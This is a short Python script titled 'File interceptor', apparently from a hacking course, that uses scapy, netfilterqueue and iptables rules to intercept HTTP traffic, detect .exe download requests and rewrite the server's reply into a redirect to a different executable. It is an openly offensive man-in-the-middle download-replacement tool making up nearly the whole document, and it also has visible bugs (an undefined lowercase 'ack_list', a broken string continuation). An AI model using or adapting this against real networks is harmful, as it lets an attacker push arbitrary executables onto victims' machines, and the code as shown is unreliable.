#!/usr/bin/env python

"""
File interceptor
- # run iptables
- iptables -I INPUT -j NFQUEUE --queue-num 0
- iptables -I OUTPUT -j NFQUEUE --queue-num 0
- # flush tables
- iptables --flush

- sport = source port
- dport = destination port
"""

import scapy.all as scapy
import netfilterqueue


ACK_LIST = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # dport = destination port
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                # add handshake to ack list
                ACK_LIST.append(scapy_packet[scapy.TCP].ack)
        # sport = source port
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ACK_LIST.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                dst_url = "HTTP/1.1 301 Moved Permanently\n" +
                "Location: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                mod_packet = set_load(scapy_packet, dst_url)
                packet.set_payload(str(mod_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
